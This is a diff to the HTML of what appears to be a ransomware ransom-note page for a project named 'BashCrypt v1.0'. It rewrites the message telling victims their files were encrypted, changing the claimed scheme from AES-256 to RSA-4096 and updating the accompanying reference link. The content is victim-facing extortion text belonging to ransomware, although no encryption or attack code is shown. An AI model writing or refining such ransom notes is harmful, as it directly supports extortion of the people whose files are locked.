@@ -93,9 +93,9 @@ $conn->close();
   <div id="what_happened">
     * What happened to your files?
     <br /><br />
-    All of your files were protected by a strong encryption with AES-256 using BashCrypt v1.0. 
+    All of your files were protected by a strong encryption with RSA-4096 using BashCrypt v1.0. 
     <br />
-    More information about the encryption keys using AES-256 can be found here: <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES Encryption Standard</a>.
+    More information about the encryption keys using RSA-4096 can be found here: <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA Cryptosystem</a>.
     <br /><br />
     * What does this mean?
     <br /><br />
@@ -107,7 +107,7 @@ $conn->close();
     <br /><br />
     * How did this happen?
     <br /><br />
-    Especially for you, we generated the secret key pair AES-256 - public and private keys. 
+    Especially for you, we generated the secret key pair RSA-4096 - public and private keys. 
     <br />
     All your files were encrypted with the public key, which has been transferred to your computer via the Internet.
     <br />
